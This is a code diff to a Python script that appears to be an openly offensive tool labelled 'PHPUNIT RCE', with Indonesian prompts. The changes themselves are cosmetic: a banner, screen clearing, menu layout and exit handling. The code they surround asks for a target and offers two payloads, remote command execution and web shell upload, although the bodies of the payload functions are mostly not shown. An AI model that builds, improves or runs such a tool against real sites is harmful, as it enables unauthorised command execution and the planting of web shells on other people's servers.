@@ -1,7 +1,37 @@
-import requests, re, sys, os
+import requests, platform, time, re, sys, os
 
 def banner():
-    print('PHPUNIT RCE')
+    print('''
+ ____  _   _ ____  _   _ _   _ ___ _____ 
+|  _ \| | | |  _ \| | | | \ | |_ _|_   _|
+| |_) | |_| | |_) | | | |  \| || |  | |  
+|  __/|  _  |  __/| |_| | |\  || |  | |  
+|_|   |_| |_|_|    \___/|_| \_|___| |_|  
+                                         
+██████╗  ██████╗███████╗
+██╔══██╗██╔════╝██╔════╝
+██████╔╝██║     █████╗  
+██╔══██╗██║     ██╔══╝  
+██║  ██║╚██████╗███████╗
+╚═╝  ╚═╝ ╚═════╝╚══════╝
+By: NuLz | Haxorstars
+''')
+    
+def clear():
+    try:
+        system_info = platform.system()
+        if system_info == "Windows":
+            time.sleep(1)
+            os.system("cls")
+            time.sleep(1)
+        elif system_info == "Linux":
+            time.sleep(1)
+            os.system("clear")
+            time.sleep(1)
+        else:
+            print("Terjadi Kesalahan.")
+    except Exception as e:
+        print("Terjadi Kesalahan.", e)
 
 def payloadCMD(target):
     while True:
@@ -31,22 +61,44 @@ def payloadUPSHELL(target):
     print(res)
 
 def nulzGG():
+    clear()
     banner()
     target = input('TARGET >: ')
     print('''
-[+] Select Payload
+[ Select Payload ]
+--------------------------
 [1] RCE (Command)
 [2] UPSHELL (Upload Shell)
+--------------------------
 ''')
     select_payload = input("Select >: ")
-    try:
-        selected_payload = int(select_payload)
-        if selected_payload == 1:
-            payloadCMD(target)
-        elif selected_payload == 2:
-            payloadUPSHELL(target)
-    except ValueError:
-        print('Mohon Masukan Pilihan Hanya Angka, Tidak Huruf')
+    if select_payload:
+        try:
+            selected_payload = int(select_payload)
+            if selected_payload == 1:
+                payloadCMD(target)
+            elif selected_payload == 2:
+                payloadUPSHELL(target)
+        except ValueError:
+            print('Mohon Masukan Pilihan Dengan Benar')
+    else:
+        print('Mohon Masukan Pilihan Dengan Benar')
 
 if __name__ == '__main__':
-    nulzGG()
+    while True:
+        try:
+            nulzGG()
+        except KeyboardInterrupt:
+            quest = input('\nApakah anda ingin keluar? Y/N >: ')
+            if quest:
+                if quest == 'y' or quest == 'Y':
+                    print('Anda Keluar!')
+                    exit()
+                elif quest == 'n' or quest == 'N':
+                    continue
+                else:
+                    print('Mohon Masukan Pilihan Dengan Benar')
+                    continue    
+            else:
+                print('Mohon Masukan Pilihan Dengan Benar')
+                continue
